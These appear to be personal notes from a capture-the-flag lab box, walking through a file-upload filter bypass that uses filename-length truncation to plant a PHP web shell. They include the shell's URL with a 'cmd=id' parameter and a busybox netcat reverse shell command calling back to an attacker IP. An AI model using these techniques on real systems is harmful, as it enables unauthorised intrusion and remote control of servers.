We know that the upload function downloads images using a URL. Tried to upload .php files by trying
- php%00.png
- php".png
- php'.png 
none of them worked. Even tried PhP, php7, PHP, pHp, etc. but none worked. 

The admin profile page says
![[Pasted image 20240904154120.png]]

Using the walkthrough, "Know your limits" is actually a hint for character limit on a file name that is acceptable when it gets saved in the backend /upload folder.

Using [[PHP Passthru]] inserted the PHP code in a file named 'Z'*232+.php+.png

ZZZZ.....ZZ.php.png

This way it saves the file as ZZZZ.....ZZ.php and omits rest of the characters. 

- Since we know the upload folder when uploading a file, navigated to
http://10.10.10.73/uploads/0904-1247_745284d2e40fc01e/ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ.php?cmd=id
![[Pasted image 20240904154504.png]]

Got a reverse shell as `www-data` using 
```bash
busybox nc 10.10.14.7 443 -e /bin/bash
```

Under `/var/www/html/connection.php`
![[Pasted image 20240904155126.png]]

